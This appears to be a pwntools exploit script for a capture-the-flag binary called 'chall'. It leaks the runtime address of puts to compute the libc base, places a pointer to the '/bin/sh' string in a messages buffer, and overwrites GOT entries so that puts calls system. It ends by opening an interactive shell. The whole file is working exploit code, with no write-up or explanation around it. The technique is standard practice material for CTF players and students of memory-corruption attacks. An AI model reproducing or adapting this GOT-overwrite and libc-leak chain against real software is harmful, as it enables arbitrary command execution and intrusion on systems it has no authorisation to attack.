from pwn import *

elf = context.binary = ELF("./chall")
p = process()
libc = elf.libc

payload = p64(elf.got["puts"]) * 8 
payload += p64(elf.sym["messages"] + 0x50)


p.recvline()
p.sendline(payload)
LEAK = p.recv(6)
LEAK = u64(LEAK + b"\x00" * (8 -len(LEAK)))
libc.address = LEAK - libc.sym["puts"]
print(hex(libc.address))

payload = p64(next(libc.search(b"/bin/sh\x00"))) * 8 
payload += p64(elf.sym["messages"] + 0x50)
p.sendline(payload)

p.clean()


offset = 0
payload = flat([
    p64(libc.sym["system"]),
    p64(libc.sym["setbuf"]),
    p64(libc.sym["read"]),
    p64(libc.sym["srandom"]),
    p64(libc.sym["system"]),
    p64(libc.sym["time"]),
    p64(libc.sym["malloc"]),
    p64(libc.sym["rand"]),
])
payload += p64(elf.got["puts"] + 0x50)
# gdb.attach(p,"b *main + 103")
p.sendline(payload)


p.interactive()
